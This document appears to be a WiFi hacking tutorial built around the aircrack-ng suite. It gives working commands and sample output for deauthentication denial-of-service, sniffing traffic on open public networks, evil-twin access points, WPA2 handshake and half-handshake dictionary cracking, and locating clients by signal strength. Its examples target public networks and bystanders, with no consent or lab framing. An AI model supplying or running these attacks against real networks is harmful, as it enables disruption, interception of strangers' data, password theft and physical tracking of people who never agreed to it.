# WiFi hacking

##Getting started
For many of these examples I'll be making use of the [aircrack suite](http://www.aircrack-ng.org/) which is a tool designed for WiFi hacking.

Some of these attacks require multiple WiFi devices. Your chipset may or may not have all the required built in functionality for these attacks, so I recommend buying one you know is compatible. I know the [Ralink RT3070](http://www.amazon.com/gp/product/B009UWLF62/ref=oh_aui_detailpage_o01_s00?ie=UTF8&psc=1) is completely compatible with everything in this post.
 
Many of these attacks also require your device be put into **monitor mode** which can be done with the following aircrack command

``` bash
$ airmon-ng <start|stop> <interface>
```

This creates a new interface (for this post it's assumed this is **mon0**) and puts it in monitor mode.


There are different attacks one can perform depending on a number of factors, however these attacks generally fall into one of the following categories 

 * **Denial of Service:** Prevent a user from using WiFi
 * **Content inspection:** View resources being sent to and from a user 
 * **Content injection:** Send a user malicious content they didn't ask for

Note: Sending packets (generally associated with _Content injection_ and _Denial of Service_) is a destructive process. Your device has to put out RF signals to perform these attacks, and they can be **triangulated back to your location**. Reading packets from around you (generally associated with _Content inspection_) is a non-destructive process. It's impossible for an outside observer to know if your computer is reading packets or not, even if those packets weren't explicitly sent to your device.

I'll be talking about the types of situations you can perform each type of attack.  

##Deauthentication
Built into the 802.11 protocol there is a deauthenticate packet. This packet is normally sent to clients from an Access Point to let the client know the connection is being terminated. It doesn't matter what type of encryption the Access Point is using; these packets look the same regardless. This means they can always be used by an attacker as a _Denial of Service_ and it's often combined with other attacks discussed later. 

This type of attack generally comes in two different flavors seen below

* **Broadcast:** These can are sent from an Access Point to no specified destination address. Many clients will recognize this and drop connection. Below is an example from the aircrack suite to impersonate the Access Point 00:14:6C:7E:40:80 and send a broadcast deauth packet

``` bash
$ aireplay-ng -0 1 -a 00:14:6C:7E:40:80 mon0
```
* **Targeted:** This is sent from an Access Point to a specific client. These are generally considered more effective, as some clients ignore the broadcasts. Below is an example of targeting client 00:0F:B5:34:30:30 impersonating the same access point as above. 

```bash 
$ aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 mon0
```

Clients will generally attempt to reconnect after being deauthenticated, however these can be also be repeated (the 1 in the above commands can be changed to the number of repeat times desired).

##Open networks

An open WiFi network is a network that does not use any type of encryption between client and Access Point. These are often found in coffee shops and other public areas.

To view all the open networks in your area you can use the following aircrack command

```bash
$ sudo airodump-ng --encrypt OPN mon0
```

below is a sample output

``` bash
 CH -1 ][ Elapsed: 3 mins ][ 2015-01-11 19:44                                         
                                                                                                                                               
 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID                                                                
                                                                                                                                               
 06:1D:D4:2C:ED:60  -88        9        0    0  11  54e  OPN              xfinitywifi                                                          
 16:AB:F0:9F:DC:30  -77        2        0    0   6  54e  OPN              xfinitywifi                                                          
 00:00:00:00:00:00  -72       11        0    0   6  54   OPN              <length:  0>                                                         
 CE:03:FA:DC:2C:94  -49        3        0    0   1  54e. OPN              xfinitywifi                                                          
 10:5F:06:CC:36:98   -1        0        0    0 158  -1                    <length:  0>                                                         
                                                                                                                                                
 BSSID              STATION            PWR   Rate    Lost  Packets  Probes                                                                      
                                                                                                                                                
 (not associated)   64:9A:BE:E7:FD:70  -89    0 - 1      0        1                                                                             
 (not associated)   1C:1A:C0:99:13:FA  -61    0 - 1      0       20                                                                             
 (not associated)   8C:3A:E3:70:75:F1  -81    0 - 1      0        2       
```

Above are all Access Points with open networks in range. Below the Access Points are all clients either attached to open networks or not associated.

Because these access points do not require any encryption _Content inspection_ is trivial. The following command can be used to capture all traffic on an Access Point and save it to a pcap file

``` bash
$ sudo airodump-ng -c 11 --bssid 06:1D:D4:2C:ED:60 -w xfinitywifi.pcap mon0
```
Where the channel (-c 11) and bssid (--bssid 06:1D:D4:2C:ED:60) are obtained from the scan above.

Some traffic may be encrypted on the application layer with SSL/TLS, however anything that isn't can be viewed in plain text from this capture file. To view the plain text bits of it you can run **strings** on the file, or you can simply open the file up in [wireshark](https://www.wireshark.org/) for your viewing pleasure.

Clients that are connected to open networks will probably attempt to reconnect if deauthenticated. For this reason you can setup an access point with the same SSID and send deauth packets to connected users until they connect to your access point.

To setup an ad-hoc Access Point the following guide can be used for ubuntu http://ubuntuhandbook.org/index.php/2014/09/3-ways-create-wifi-hotspot-ubuntu/ 

Once you have users connected to your ad-hoc network you are in a position for both _Content Injection_ and _Content inspection_

## WPA/WPA2 networks

The only way to perform _content injection_ or _content inspection_ on a WPA/WPA2 network is to run a dictionary or brute force attack against the authentication handshake. This can be captured and performed locally for a quick crack if you're lucky. Repeating the process for scanning for networks in the previous section, you can scan for networks using the following 

```bash
$ sudo airodump-ng mon0
```
 Because we didn't specify an encryption type this time it will show all available networks. 

Select a WPA/WPA2 network you're interested in and start capturing

``` bash
$ sudo airodump-ng -c 10 --bssid 10:70:CA:BE:AB:EE -w tomsEncryptedNetwork.pcap mon0
```

When a handshake occurs it will display it along the top as seen below

```bash
  CH  9 ][ Elapsed: 4 s ][ 2007-03-24 16:58 ][ WPA handshake: 10:70:CA:BE:AB:EE
                                                                                                               
  BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB  ENC  CIPHER AUTH ESSID
                                                                                                               
  10:70:CA:BE:AB:EE   39 100       51      116   14   9  54  WPA2 CCMP   PSK  teddy                           
                                                                                                               
  BSSID              STATION            PWR  Lost  Packets  Probes                                             
                                                                                                               
  10:70:CA:BE:AB:EE  00:0F:B5:FD:FB:C2   35     0      116  
```

You can either wait for a handshake the slow way, or you can deauthenticate user's using above techniques and wait for them to reconnect.

This handshake can now be used with aircrack to perform a dictionary attack locally. The following command can be used to do this 

```bash
aircrack-ng -w passwords.txt -b 10:70:CA:BE:AB:EE tomsEncryptedNetwork.pcap
```

Where password.txt is a file of newline separated likely passwords. You can obtain such a password from a number of places; [I found a few off google](https://wiki.skullsecurity.org/Passwords)

With any luck this will identify the password used, and allow you to then repeat the process from the open network to throw up your own network with the same SSID and password as the encrypted network.

If you capture a full handshake, and you manage to crack the password, you have all the keys necessary to decrypt WPA2 traffic. Each time a client connects new keys are generated, so the handshake is specific to that session. One way to do this is in wireshark, with the following tutorial http://wiki.wireshark.org/HowToDecrypt802.11

If you know the passphrase but you did not capture the full handshake, you will probably not be able to decrypt the traffic from that dump however one thing I noticed is that the Nonces used to calculate the keys in the handshake are often very low entropy and may be predictable.

##WEP Networks

I'm not going to spend too much time talking about WEP networks because they are not as common anymore. The following guide can be used to crack WEP networks http://www.aircrack-ng.org/doku.php?id=simple_wep_crack

##No network, just clients
Clients will send probes asking for WiFi networks with known SSIDs. These are broadcasted out unencrypted. They can be viewed with the same WiFi network monitor command used above

```bash
$ sudo airodump-ng mon0
```

You'll see more of them popping up if you begin sending deauth packets to networks that have lots of clients. 

If you notice a probe for a network that might be open, like 'Public Library Wifi' or something along those lines, you can throw up an ad-hoc network with that SSID and the client will probably connect to you.

If the client is broadcasting a WPA2 network, you can throw up an SSID the same as the one they are looking for, even if the passphrase is wrong, and capture half of the 4 way handshake, and then use this half handshake to run a dictionary attack against the hashed passphrase the client sent you.

Aircrack does not have a built in way of doing this so I wrote a tool for it seen here https://github.com/dxa4481/WPA2-HalfHandshake-Crack

Once cracked, you can throw up an ad-hoc network and have the client probing for that network connect to you.

##Triangulating clients

You'll notice from the above airodump outputs, PWR is an output for each client.

Recreate the airodump output with the following

```bash
$ sudo airodump-ng mon0
```

Although this value is greatly interfered with by walls, people, furniture, and other signal interference obstacles, with some degree of certainty it can be used to approximate that client's location.  

Three wifi devices with identical hardware will be needed at a minimum, though more devices refines the location more accurately.

I've been told due to interference with 3 devices this method will give you a resolution of about 20 feet.
